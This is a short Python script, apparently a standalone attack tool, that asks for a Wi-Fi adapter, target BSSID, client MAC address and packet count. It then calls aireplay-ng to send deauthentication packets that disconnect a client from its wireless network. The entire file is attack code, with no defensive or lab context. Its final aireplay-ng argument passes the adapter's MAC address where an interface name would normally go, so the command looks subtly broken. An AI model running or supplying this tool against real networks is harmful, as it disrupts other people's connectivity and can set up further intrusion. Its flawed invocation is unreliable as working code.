import subprocess

from getmac import getmac


class DeauthAttack:
    def __init__(self, adapter):
        self.adapter = adapter

    def execute_attack(self, client_bssid, deauth_pack, client_mac):
        '''Deauth attack function'''
        current_mac = getmac.get_mac_address(interface=self.adapter)
        print(f'Deauth attack against {client_bssid} on {client_mac} using {current_mac}')
        subprocess.run(
            ['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, current_mac],
            check=True)


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    client_bssid = input("[+] Input client BSSID: ")
    deauth_pack = int(input("[+] Input number of deauth packets: "))
    client_mac = input("[+] Input client MAC address: ")

    deauth = DeauthAttack(adapter)
    deauth.execute_attack(client_bssid, deauth_pack, client_mac)


if __name__ == "__main__":
    main()

